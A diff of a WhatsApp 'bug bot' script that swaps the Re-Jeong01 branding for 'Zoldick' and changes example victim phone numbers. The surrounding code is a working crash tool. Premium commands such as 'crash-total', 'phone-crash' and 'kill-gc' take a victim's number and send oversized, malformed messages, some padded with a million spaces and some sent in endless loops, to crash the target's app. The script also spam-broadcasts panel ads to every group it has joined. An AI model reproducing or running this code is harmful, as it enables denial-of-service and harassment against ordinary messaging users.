@@ -296,7 +296,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 listResponseMessage: {
-title: `Re-Jeong01`
+title: `ZOLDICK-EMPIRE`
 }
 }
 }
@@ -310,7 +310,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 buttonsResponseMessage: {
-selectedButtonId: 'Re-Jeong01',
+selectedButtonId: 'ZOLDICK-EMPIRE,
 type: 1,
 response: {
 selectedDisplayText: 'penis'
@@ -331,7 +331,7 @@ newsletterAdminInviteMessage: {
 newsletterJid: `120363224727390375@newsletter`,
 newsletterName: `🔥`,
 jpegThumbnail: fakejpg,
-caption: `Re-Jeong01 - Bug ? \n ⿻ ${m.body || m.mtype} `,
+caption: `ZOLDICK-EMPIRE- Bug ? \n ⿻ ${m.body || m.mtype} `,
 inviteExpiration: Date.now() + 1814400000
 }
 }
@@ -407,7 +407,7 @@ remoteJid: "status@broadcast"
 message: {
 "extendedTextMessage": {
 "text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
-"title": `⟠ Re-Jeong01🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
+"title": `⟠ Zoldick🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
 'jpegThumbnail': fakejpg,
 }
 }
@@ -429,7 +429,7 @@ message: {
 "jpegThumbnail": fakejpg,
 },
 "title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
-"description": `⟠ Re-Jeong01🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
+"description": `⟠ Zoldick🔥 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
 "currencyCode": "IDR",
 "priceAmount1000": "1000000000000000000",
 "retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
@@ -827,7 +827,7 @@ async function pirgam(target, kuwoted) {
         text: ""
       },
       footer: {
-        text: "›          #Re-Jeong01"
+        text: "›          #Zoldick1"
       },
       nativeFlowMessage: {
         messageParamsJson: " ".repeat(1000000)
@@ -856,7 +856,7 @@ await deltaxcrash.sendMessage(from, {text: xeonlod[i], edit: key });
 async function baklis(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
   'listMessage': {
-    'title': "⟠ Re-Jeong01 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
+    'title': "⟠ Zoldick1 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
         'footerText': `✳️᜴࿆͆᷍꓄҉ꁝ҉ꏂ҉ ꄲ҉ꋊ҉ꏂ҉⃝🥷⃞⭑👻⃟ ꋪ҉ꏂ҉-҉꒻҉ꏂ҉ꄲ҉ꋊ҉ꍌ҉ཀ͜͡😈⃟╮.xp`,
         'description': `✳️᜴࿆͆᷍꓄҉ꁝ҉ꏂ҉ ꄲ҉ꋊ҉ꏂ҉⃝🥷⃞⭑👻⃟ ꋪ҉ꏂ҉-҉꒻҉ꏂ҉ꄲ҉ꋊ҉ꍌ҉ཀ͜͡😈⃟╮.xp`,
         'buttonText': null,
@@ -995,55 +995,56 @@ const menu = `
 ╭•┈┈⛧┈BOT-INFO┈⛧┈┈•༶
 ▫  𝖭𝖺𝗆𝖺 : ${pushname}
 ▫  𝖲𝗍𝖺𝗍𝗎𝗌 : ${isPremium ? "Premium" : "Free"}
-▫  Owner: *Re-jeong*
+▫  Owner: ☆*Sigma Zoldick*☆
 └────────────────────
 
 > ${run} 
 ─────────────────────
-「BOT SETTING ONLY OWNER」
+「Zoldick☆settings 」
 ▫  ${prefix}self
 ▫  ${prefix}public
-▫  ${prefix}addprem 27xx
-▫  ${prefix}delprem 27xx
-▫  ${prefix}addowner 27xx
-▫  ${prefix}delowner 27xx
+▫  ${prefix}addprem 221xx
+▫  ${prefix}delprem 221xx
+▫  ${prefix}addowner 221xx
+▫  ${prefix}delowner 221xx
+▫️  ${prefix}ping (under maintenance)
 ─────────────────────
 
-「NEW BUG *Re-J* V3」
-▫  ${prefix}virus999 27xxx
-▫  ${prefix}restart-maker 27xxx
-▫  ${prefix}clear-data 27xxxx
-▫  ${prefix}slam 27xxx
-▫  ${prefix}crash-total 27xxx
-▫  ${prefix}satanic999 27xxx
-▫  ${prefix}Re-Jeong01  27xxx
+「Zoldick☆kill」
+▫  ${prefix}virus999 221xxx
+▫  ${prefix}restart-maker 221xxx
+▫  ${prefix}clear-data 221xxxx
+▫  ${prefix}slam 221xxx
+▫  ${prefix}crash-total 221xxx
+▫  ${prefix}satanic999 221xxx
+▫  ${prefix}zoldick  221xxx
 ─────────────────────
-「NEW VIP BUG *Re-J* V3」
-▫  ${prefix}reboot 27xxx
-▫  ${prefix}reset 27xxx
-▫  ${prefix}🗿 27xxx
-▫  ${prefix}🔥 27xxx
+「Zoldick☆VIP」
+▫  ${prefix}reboot 221xxx
+▫  ${prefix}reset 221xxx
+▫  ${prefix}🗿 221xxx
+▫  ${prefix}🔥 221xxx
 ▫  ${prefix}bug-gc <linkgroup>
 ▫  ${prefix}ui-grup <linkgroup>
 ▫  ${prefix}reset-gc <linkgroup>
 ▫  ${prefix}kill-gc <120###@g.us>
 ─────────────────────
-「NEW VIP BUG *Re-J* V3」
-▫  ${prefix}victory27 <27xxx, amount>
-▫  ${prefix}virus-id <27xxx|amount>
-▫  ${prefix}reset-ui <27xxx, amount>
-▫  ${prefix}hey <27xxx, amount>
-▫  ${prefix}maker1 <27xxx, amount>
-▫  ${prefix}maker404 <27xxx, amount>
+「Zoldick☆new VIP」
+▫  ${prefix}victory27 <221xxx, amount>
+▫  ${prefix}virus-id <221xxx|amount>
+▫  ${prefix}reset-ui <221xxx, amount>
+▫  ${prefix}hey <221xxx, amount>
+▫  ${prefix}maker1 <221xxx, amount>
+▫  ${prefix}maker404 <221xxx, amount>
 ─────────────────────`
            deltaxcrash.sendMessage(m.chat, { 
 	           text: menu,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
-                            title: '「Re-Jeong 01」',
+                            title: '「Zoldick 01」',
                             //body: global.namaCreator,
-                            thumbnailUrl: 'https://telegra.ph/file/0c68bcfdbab622c715471.jpg', 
+                            thumbnailUrl: 'https://telegra.ph/file/7cfd07c8ed288dbd90d1a.jpg', 
                             //sourceUrl: global.isLink,
                             previewType: "PHOTO", 
                             mediaType: 1,
@@ -1124,7 +1125,7 @@ Payload.include(" payload": false )
 )
 } else reply(util.format(res.data))
 } catch (err) {m.reply(`Fitur ini memerlukan persetujuan owner tools Re-Jeong01`)}
-} else reply(' Fitur ini memerlukan persetujuan owner tools Re-Jeong01')
+} else reply(' Fitur ini memerlukan persetujuan owner tools Zoldick1')
 }
 break
 
@@ -1132,9 +1133,9 @@ break
 
 case 'gfsCdgsGsGs-blank': {
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221774317372`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221774317372`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 30; j++) {
@@ -1168,9 +1169,9 @@ await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.▫\n\n
 break
 case 'reboot': { 
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221774317372`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221774317372`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 30; j++) {
@@ -1211,8 +1212,8 @@ let getGroups = await deltaxcrash.groupFetchAllParticipating()
 let groupss = Object.entries(getGroups).slice(0).map((entry) => entry[1])
 let data = groupss.map((v) => v.id)
 
-let teks22 = `LIST HARGA PANEL Re-Jeong01\n\n 8 GB 5K \n UNLI 10K\n\n spesifikasi panel\n ram 16 gb\n room 200 gb \n anti delay`
-const buf = await getBuffer(`https://telegra.ph/file/0c68bcfdbab622c715471.jpg`)
+let teks22 = `LIST HARGA PANEL Zoldick1\n\n 8 GB 5K \n UNLI 10K\n\n spesifikasi panel\n ram 16 gb\n room 200 gb \n anti delay`
+const buf = await getBuffer(`https://telegra.ph/file/7cfd07c8ed288dbd90d1a.jpg`)
 for (let x of data) {
 await deltaxcrash.sendMessage(x, {audio: fs.readFileSync(ntahlahh9), mimetype:'audio/mpeg', ptt: true }, m)
 await deltaxcrash.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: false }, image: buf, caption: teks22 })
@@ -1223,9 +1224,9 @@ reply(`Success send broadcast message to ${data.length} groups chats`)
 break
 case 'CN892BB1 ': { 
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221774317372`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221774317372`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 30; j++) {
@@ -1259,9 +1260,9 @@ await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.▫\n\n
 break
 case 'gfsCdgsGsGs': { 
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221774317372`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221774317372`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 30; j++) {
@@ -1295,9 +1296,9 @@ await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.▫\n\n
 break
 case 'gfsCdgsGsGs': { 
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221774317372`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221774317372`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 30; j++) {
@@ -1331,9 +1332,9 @@ await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.▫\n\n
 break
 case 'gfsCdgsGsGs': { 
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221774317372`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221774317372`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 30; j++) {
@@ -1367,7 +1368,7 @@ await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.▫\n\n
 break
 case "addowner":
 if (!isOwner) return reply(mess.only.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 27632461796`)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 221774317372`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
 let ceknye = await deltaxcrash.onWhatsApp(bnnd + `@s.whatsapp.net`)
 if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
@@ -1377,7 +1378,7 @@ reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
 break
 case "delowner":
 if (!isOwner) return reply(mess.only.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 27632461796`)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 221774317372`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = ownerNumber.indexOf(ya)
 ownerNumber.splice(unp, 1)
@@ -1387,11 +1388,11 @@ break
 case "jids-unexpected": {
 
 if (!isPremium) return reply('_</> owner only..._')
-  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 27xxxxxxxxxx,5`) 
+  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 221xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 27xxxxxxxxxx,5`) 
+    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 221xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return reply("Amount must be a number");
@@ -1400,7 +1401,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -1420,11 +1421,11 @@ break;
 case "gfsCdgsGsGs": {
 
 if (!isPremium) return reply('_</> owner only..._')
-  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 27xxxxxxxxxx,5`) 
+  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 221xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 27xxxxxxxxxx,5`) 
+    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 221xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return reply("Amount must be a number");
@@ -1433,7 +1434,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -1453,11 +1454,11 @@ break;
 case "gfsCdgsGsGs": {
 
 if (!isPremium) return reply('_</> owner only..._')
-  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 27xxxxxxxxxx,5`) 
+  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 221xxxxxxxxxx,5`) 
   let number = text.split(',')[0];
   let amount = text.split(',')[1] * 5;
   if (!number || !amount) {
-    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 27xxxxxxxxxx,5`) 
+    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 221xxxxxxxxxx,5`) 
   }
   if (isNaN(parseInt(amount))) {
     return reply("Amount must be a number");
@@ -1466,7 +1467,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -1995,7 +1996,7 @@ case 'chace-bug': {
 if (!isPremium) return reply('_</> owner only..._')
 if (!q) return reply(`Penggunaan .${command} 27632461796`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221774317372`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 50; j++) {
@@ -2041,9 +2042,9 @@ break
 case 'gfsCdgsGsGs': {
 
 if (!isPremium) return reply('_</> owner only..._')
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221774317372`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221774317372`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 50; j++) {
@@ -2103,7 +2104,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2136,7 +2137,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2169,7 +2170,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2202,7 +2203,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2235,7 +2236,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2268,7 +2269,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2301,7 +2302,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2334,7 +2335,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2367,7 +2368,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2400,7 +2401,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2433,7 +2434,7 @@ if (!isPremium) return reply('_</> owner only..._')
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "27632461796") {
+  if (cleanedNumber == "221774317372") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2453,9 +2454,9 @@ break;
 case 'gfsCdgsGsGs': {
 
 if (!isPremium) return reply('_</> owner only..._')
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 2××××××`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 2××××××`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 50; j++) {
@@ -2501,9 +2502,9 @@ break
 case 'gfsCdgsGsGs': {
 
 if (!isPremium) return reply('_</> owner only..._')
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221××××××`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221×××××`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 50; j++) {
@@ -2550,9 +2551,9 @@ break
 case 'stardust': {
 
 if (!isPremium) return reply('_</> owner only..._')
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221×××××`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221×××××`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 40; j++) {
@@ -2616,9 +2617,9 @@ break
 case 'deltax': case 'deltax2': {
 
 if (!isPremium) return reply('_</> owner only..._')
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221××××××`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221×××××`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 30; j++) {
@@ -2650,9 +2651,9 @@ break
 case 'deltax3': case 'deltax4': {
 
 if (!isPremium) return reply('_</> owner only..._')
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221×××××`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221×××××`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 10; j++) {
@@ -2802,9 +2803,9 @@ break
 case 'virus999': case 'restart-maker': case 'deltax5': case 'clear-data': {
 
 if (!isPremium) return reply('_</> owner only..._')
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221×××××`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221××××`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (let j = 0; j < 1; j++) {
@@ -2819,12 +2820,12 @@ await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}.▫\n\n
 }
 break
 //=================================================//
-case 'Re-Jeong01 ': case 'gfsCdgsGsGs': {
+case 'Zoldick1 ': case 'gfsCdgsGsGs': {
 
 if (!isPremium) return reply('_</> owner only..._')
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221×××××`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221×××××`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
 for (;;) {
@@ -2883,9 +2884,9 @@ reply(`Successfully Sent Bug To ${victim}`)
 case 'phone-crash': {
 
 if (!isPremium) return reply('_</> owner only..._')
-if (!q) return reply(`Penggunaan .${command} 27632461796`)
+if (!q) return reply(`Penggunaan .${command} 221××××××`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 27632461796`)
+if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 221××××××`)
 let target = bijipler + '@s.whatsapp.net'
 await reply(`</> crash sudah terkirim... `)
   for (;;) {
@@ -2913,7 +2914,7 @@ message: {
       "text": "🩸⃟༑⌁⃰꓄҉ꁝ҉ꏂ҉ ꄲ҉ꋊ҉ꏂ҉🥷👻 ꋪ҉ꏂ҉-҉꒻҉ꏂ҉ꄲ҉ꋊ҉ꍌ҉ཀ͜͡🦠"
     },
     "footer": {
-      "text": "›          #Re-Jeong01"
+      "text": "›          #Zoldick1"
     },
     "nativeFlowMessage": {
       "buttons": [
@@ -2953,7 +2954,7 @@ message: {
